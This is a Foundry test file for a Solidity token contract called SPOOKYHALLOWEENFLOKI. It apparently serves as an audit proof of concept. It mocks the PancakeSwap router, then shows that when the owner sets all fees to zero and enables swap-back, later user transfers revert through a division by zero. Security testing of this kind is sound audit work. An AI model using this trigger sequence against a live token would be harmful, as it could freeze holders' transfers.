// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/SPOOKYHALLOWEENFLOKI.sol";

// Mock contracts to simulate external dependencies
contract MockRouter {
    address public factory;
    address public WETH;
    
    constructor() {
        factory = address(0);
        WETH = address(0);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint, uint, address[] calldata, address, uint
    ) external payable {}
    
    function addLiquidityETH(address, uint, uint, uint, address, uint) 
        external payable returns (uint, uint, uint) 
    {
        return (0,0,0);
    }
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint, address[] calldata, address, uint
    ) external payable {}
}

contract MockERC20 {
    function balanceOf(address) external pure returns (uint256) { return 0; }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123);
    }
}

contract ZeroDivisionTest is Test {
    SPOOKYHALLOWEENFLOKI token;
    address constant routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address owner = address(0x1);
    address user = address(0x2);

    function setUp() public {
        // Deploy mock contracts
        MockERC20 weth = new MockERC20();
        MockFactory factory = new MockFactory();
        MockRouter routerImpl = new MockRouter();

        // Configure mock router storage
        vm.etch(routerAddr, address(routerImpl).code);
        bytes32 slot0 = bytes32(uint256(0));
        bytes32 slot1 = bytes32(uint256(1));
        bytes32 valFactory = bytes32(uint256(uint160(address(factory))));
        bytes32 valWeth = bytes32(uint256(uint160(address(weth))));

        vm.store(routerAddr, slot0, valFactory);
        vm.store(routerAddr, slot1, valWeth);

        // Deploy token
        vm.startPrank(owner);
        token = new SPOOKYHALLOWEENFLOKI();
        token.tradingStatus(true);
        
        // Configure transfer limits
        token.setMaxWalletPercent_base1000(10000);
        token.setMaxTxPercent_base1000(10000);
        
        // Distribute initial tokens
        uint256 ownerBalance = token.balanceOf(owner);
        token.transfer(user, ownerBalance / 2);
        vm.stopPrank();
    }

    function test_DivisionByZeroInSwapBack() public {
        console2.log("--- BEFORE-Trigger Transfer ---");
        // Pre-trigger: Perform safe transfer (should succeed)
        vm.prank(user);
        (bool preSuccess, ) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(0x9), 1)
        );
        console2.log("Pre-trigger transfer status: %s", preSuccess ? "SUCCESS" : "FAILED");

        console2.log("--- Trigger Vulnerability Parameters ---");
        vm.startPrank(owner);
        // Set all fees to zero to force division by zero
        token.setFees_base1000(0, 0, 0, 0, 0, 0);
        console2.log("All fees set to 0%");
        
        // Enable swap back functionality
        token.setSwapBackSettings(true, 1000);
        console2.log("Swap back enabled with threshold 1000");
        
        // Fund token contract to trigger swap logic
        token.transfer(address(token), 2000);
        console2.log("Contract funded to meet swap threshold");
        vm.stopPrank();

        console2.log("--- AFTER-Trigger Transfer ---");
        // Attempt similar transfer after vulnerability trigger
        vm.prank(user);
        (bool postSuccess, ) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(0xA), 1)
        );
        console2.log("Post-trigger transfer status: %s", postSuccess ? "SUCCESS" : "FAILED");

        // Differential verification
        if (preSuccess && !postSuccess) {
            console2.log("Vulnerability Exists: Transactions revert when fees=0 due to division by zero");
        } else {
            console2.log("Vulnerability not Exist: Transfer behavior unchanged");
        }
    }
}